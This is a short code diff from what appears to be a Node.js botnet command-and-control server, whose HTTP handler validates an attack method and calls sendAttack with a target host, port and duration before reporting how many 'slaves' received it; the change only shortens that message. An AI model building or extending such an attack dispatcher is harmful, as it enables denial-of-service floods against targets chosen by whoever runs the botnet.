@@ -56,9 +56,7 @@ app.get("/", (req, res) => {
     if (!METHODS.includes(method))
         return res.status(404).send("method does not exist")
     sendAttack(method, host, port, time)
-    return res.send(
-        `attack sent to ${server.connections}/${clients.length} slaves.`
-    )
+    return res.send(`attack sent to ${clients.length} slaves.`)
 })
 
 var server = net.createServer(function (socket) {
